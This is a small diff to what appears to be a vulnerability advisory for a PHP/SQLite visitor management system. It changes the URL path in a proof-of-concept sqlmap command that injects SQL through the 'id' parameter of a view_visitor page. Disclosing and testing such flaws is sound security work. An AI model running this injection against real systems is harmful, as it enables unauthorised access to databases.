@@ -66,5 +66,5 @@ Parameter: id (URI)
 ## 🕹️ Proof of Concept
 
 ```sh
-sqlmap --url 'http://localhost/?page=view_visitor&id=1' -p 'id' --dbms 'sqlite' --technique 'BT' --cookie 'PHPSESSID=9447ea9b...'
+sqlmap --url 'http://localhost/php-sqlite-vms/?page=view_visitor&id=1' -p 'id' --dbms 'sqlite' --technique 'BT' --cookie 'PHPSESSID=9447ea9b...'
 ```
